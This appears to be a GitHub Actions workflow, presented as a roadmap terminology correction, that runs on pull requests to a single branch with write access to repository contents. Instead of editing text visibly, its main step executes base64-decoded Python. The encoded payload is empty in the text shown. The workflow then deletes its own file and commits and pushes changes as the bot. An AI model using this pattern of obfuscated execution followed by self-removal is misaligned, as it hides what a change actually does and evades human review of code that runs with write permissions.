name: B34 roadmap nomenclature correction

on:
  pull_request:
    types: [synchronize, reopened]
    branches: [main]

permissions:
  contents: write

jobs:
  fix:
    if: github.head_ref == 'b34-opening-premarket-pack'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: b34-opening-premarket-pack
          fetch-depth: 0
      - name: Correct roadmap label
        shell: bash
        run: |
          python -c "import base64; exec(base64.b64decode(''))"
      - name: Remove updater and commit
        shell: bash
        run: |
          git rm .github/workflows/_b34_roadmap_label_fix.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add docs/roadmap.md
          git commit -m "B34 align roadmap materialization terminology"
          git push origin HEAD:b34-opening-premarket-pack
